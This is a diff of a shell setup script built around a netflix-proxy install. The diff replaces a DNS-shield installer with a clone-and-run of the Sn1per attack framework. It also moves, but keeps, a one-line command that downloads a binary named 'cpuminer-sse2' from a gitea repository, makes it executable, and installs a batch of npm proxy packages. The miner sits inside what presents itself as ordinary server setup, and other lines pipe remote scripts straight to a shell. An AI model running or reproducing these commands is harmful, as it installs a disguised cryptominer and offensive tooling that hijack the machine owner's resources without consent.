@@ -33,9 +33,9 @@ make install
   echo "Bismillahirahmannirrahim"
   echo "====================================="
   sleep 5
-curl -s https://raw.githubusercontent.com/FredHutch/dns-shield/master/dns-shield-install.sh  > dns-shield-install.sh
-chmod +x dns-shield-install.sh
-sudo ./dns-shield-install.sh
+git clone https://github.com/1N3/Sn1per
+cd Sn1per
+bash install.sh
 
   echo "====================================="
   echo "Bismillahirahmannirrahim"
@@ -71,10 +71,6 @@ mkdir -p ~/netflix-proxy\
   echo "Bismillahirahmannirrahim"
   echo "====================================="
   sleep 5
-wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
-
-  sleep 5
-  
 sudo apt-get update\
   && sudo apt-get -y install vim dnsutils curl\
   && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
@@ -83,6 +79,12 @@ sudo apt-get update\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
+  
+  echo "====================================="
+  echo "Bismillahirahmannirrahim"
+  echo "====================================="
+  sleep 5
+wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
 
   sleep 5
   
